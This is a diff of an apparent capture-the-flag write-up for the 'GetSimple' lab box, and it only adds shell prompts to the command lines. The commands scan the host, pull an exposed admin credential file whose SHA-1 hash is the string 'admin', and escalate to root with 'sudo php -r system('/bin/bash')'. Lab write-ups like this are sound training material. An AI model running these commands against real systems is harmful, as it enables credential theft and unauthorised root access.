@@ -18,8 +18,8 @@ GetSimple is an easy Linux box, and a Getting Started / module-style target rath
 ## recon
 
 ```bash
-nmap -p- --min-rate 10000 10.129.87.63
-nmap -p22,80 -sCV 10.129.87.63
+$ nmap -p- --min-rate 10000 10.129.87.63
+$ nmap -p22,80 -sCV 10.129.87.63
 ```
 
 ```
@@ -52,7 +52,7 @@ GetSimple is a database-free CMS: it keeps everything in XML files under `/data/
 I also pulled the plugin manifest to see what was loaded:
 
 ```bash
-curl -s http://10.129.87.63/data/other/plugins.xml | xmllint --format - | grep ">"
+$ curl -s http://10.129.87.63/data/other/plugins.xml | xmllint --format - | grep ">"
 ```
 
 ```xml
@@ -65,7 +65,7 @@ curl -s http://10.129.87.63/data/other/plugins.xml | xmllint --format - | grep "
 Nothing exploitable in the plugins, but it confirmed the data directory was wide open. The real find was the admin record:
 
 ```bash
-curl -s http://10.129.87.63/data/users/admin.xml
+$ curl -s http://10.129.87.63/data/users/admin.xml
 ```
 
 ```xml
@@ -83,7 +83,7 @@ curl -s http://10.129.87.63/data/users/admin.xml
 That `PWD` value is an unsalted SHA-1, which GetSimple uses for password storage. `d033e22ae348aeb5660fc2140aec35850c4da997` is the SHA-1 of the literal string `admin`. It is a well-known digest, so no cracking is even needed, but a quick lookup or a one-line check confirms it:
 
 ```bash
-echo -n admin | sha1sum
+$ echo -n admin | sha1sum
 # d033e22ae348aeb5660fc2140aec35850c4da997
 ```
 
@@ -128,7 +128,7 @@ User www-data may run the following commands on gettingstarted:
 `php` runnable as root with no password is a clean GTFOBins entry. PHP's `system()` inside a root-run interpreter spawns a root shell:
 
 ```bash
-sudo php -r "system('/bin/bash');"
+$ sudo php -r "system('/bin/bash');"
 ```
 
 That returned a root shell and the root flag.
